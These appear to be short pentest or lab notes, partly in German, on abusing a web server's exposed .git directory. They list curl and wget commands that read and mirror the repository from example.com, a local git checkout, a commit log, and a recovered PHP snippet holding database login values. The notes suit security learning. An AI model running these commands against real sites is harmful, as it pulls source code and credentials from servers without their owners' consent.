DotGit FF Extensions
# 1) HEAD prüfen
curl -I https://example.com/.git/HEAD

# 2) Prüfe ob einfache Dateien lesbar sind
curl https://example.com/.git/HEAD
curl https://example.com/.git/config

# 3) Versuche, .git komplett runterzuladen (nur in Testumgebung!)
wget -r --no-parent https://example.com/.git/
# danach lokal: git --git-dir=.git/ checkout -f

└─$ git log --oneline --decorate --graph --all | head -n 30
git log --oneline --decorate --graph
* 44a055d (HEAD -> main) Security Update
* 621a2e7 (origin/main, origin/HEAD) Create database.php
* c9c8e8b Delete database.php
* eda55ed Create robots.txt
* ce3d418 Create search.php
* 80ad5fe Setting up database.php
* 58cfadc Create index.php
* 5e212bc Create order.php
* 0822a51 Create export.php
* 1c48db4 Initial commit
private $host = "localhost";
    private $db_name = "staff";
    private $username = "user@domain.local";
    private $password = "xyx";


